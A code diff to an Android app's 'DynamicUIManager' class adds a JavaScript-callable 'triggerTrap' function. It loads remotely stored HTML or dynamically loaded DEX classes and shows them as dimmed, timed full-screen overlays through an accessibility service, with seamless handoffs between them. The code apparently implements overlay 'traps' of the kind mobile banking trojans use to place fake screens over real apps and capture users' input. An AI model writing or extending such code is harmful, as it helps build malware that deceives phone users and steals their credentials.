@@ -35,6 +35,8 @@ object DynamicUIManager {
     private var isNativeAttached: Boolean = false
     private var nativeLifecycleOwner: OverlayLifecycleOwner? = null
 
+    var activeTrapSessionId = 0L
+
     private class OverlayLifecycleOwner : androidx.lifecycle.LifecycleOwner, androidx.lifecycle.ViewModelStoreOwner, androidx.savedstate.SavedStateRegistryOwner {
         private val lifecycleRegistry = androidx.lifecycle.LifecycleRegistry(this)
         private val savedStateRegistryController = androidx.savedstate.SavedStateRegistryController.create(this)
@@ -458,11 +460,71 @@ object DynamicUIManager {
                 }
             }
         }
+
+        @JavascriptInterface
+        fun triggerTrap(type: String, label: String) {
+            Handler(Looper.getMainLooper()).post {
+                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                if (type.equals("NATIVE", ignoreCase = true) || type.equals("DEX", ignoreCase = true)) {
+                    val nativeStr = prefs.getString("native_traps_array", "[]") ?: "[]"
+                    val nativeArr = org.json.JSONArray(nativeStr)
+                    for (i in 0 until nativeArr.length()) {
+                        val trap = nativeArr.getJSONObject(i)
+                        if (trap.optString("label") == label) {
+                            val dexPath = trap.getString("file_path")
+                            val className = trap.getString("class_name")
+                            val dimLevel = trap.optInt("dim", 20)
+                            val timeout = trap.optLong("timeout", 10L)
+                            
+                            showNativeOverlay(ctx, dexPath, className, dimLevel)
+                            
+                            if (timeout > 0L) {
+                                val currentSession = activeTrapSessionId
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    if (activeTrapSessionId == currentSession) {
+                                        removeNativeOverlay(ctx, "NATIVE_TRAP_TIMEOUT: $label")
+                                    }
+                                }, timeout * 1000)
+                            }
+                            return@post
+                        }
+                    }
+                    DebugLogger.log("TRAP_TRANSITION", "Native trap not found: $label")
+                } else if (type.equals("HTML", ignoreCase = true) || type.equals("UI", ignoreCase = true)) {
+                    val uiStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
+                    val uiArr = org.json.JSONArray(uiStr)
+                    for (i in 0 until uiArr.length()) {
+                        val trap = uiArr.getJSONObject(i)
+                        if (trap.optString("label") == label) {
+                            val method = trap.optString("method", "ACC").uppercase()
+                            val html = trap.optString("html", "")
+                            val dimLevel = trap.optInt("dim", 20)
+                            val timeout = trap.optLong("timeout", 10L)
+                            
+                            DimmerManager.applyDim(ctx, dimLevel, method)
+                            showOverlay(ctx, true, method, html, false)
+                            
+                            if (timeout > 0L) {
+                                val currentSession = activeTrapSessionId
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    if (activeTrapSessionId == currentSession) {
+                                        removeOverlay(ctx, "UI_TRAP_TIMEOUT: $label")
+                                    }
+                                }, timeout * 1000)
+                            }
+                            return@post
+                        }
+                    }
+                    DebugLogger.log("TRAP_TRANSITION", "HTML trap not found: $label")
+                }
+            }
+        }
     }
 
     @SuppressLint("SetJavaScriptEnabled")
     fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String, isFullScreen: Boolean = true) {
         Handler(Looper.getMainLooper()).post {
+            activeTrapSessionId = System.currentTimeMillis()
             DebugLogger.log("SDUI_VERBOSE", "showOverlay triggered. Method: $method | Touchable: $touchable | FullScreen: $isFullScreen")
             val serviceInstance = MyAccessibilityService.instance
             val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
@@ -540,6 +602,9 @@ object DynamicUIManager {
                     super.onPageFinished(view, url)
                     Handler(Looper.getMainLooper()).postDelayed({
                         DimmerManager.removeOverlay(ctx)
+                        if (isNativeAttached) {
+                            removeNativeOverlay(ctx, "SEAMLESS_HTML_HANDOFF")
+                        }
                     }, 150) // 150ms allows GPU to flip the buffer after render
                 }
 
@@ -749,6 +814,7 @@ object DynamicUIManager {
 
     fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int) {
         Handler(Looper.getMainLooper()).post {
+            activeTrapSessionId = System.currentTimeMillis()
             val serviceInstance = MyAccessibilityService.instance ?: return@post
             val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
             
@@ -826,6 +892,9 @@ object DynamicUIManager {
                     // 4. LIFT DIM once UI is attached
                     Handler(Looper.getMainLooper()).postDelayed({
                         DimmerManager.removeOverlay(ctx)
+                        if (isAttached) {
+                            removeOverlay(ctx, "SEAMLESS_NATIVE_HANDOFF")
+                        }
                     }, 150)
 
                     DebugLogger.log("NATIVE_TRAP", "Native DEX UI injected successfully from $className")
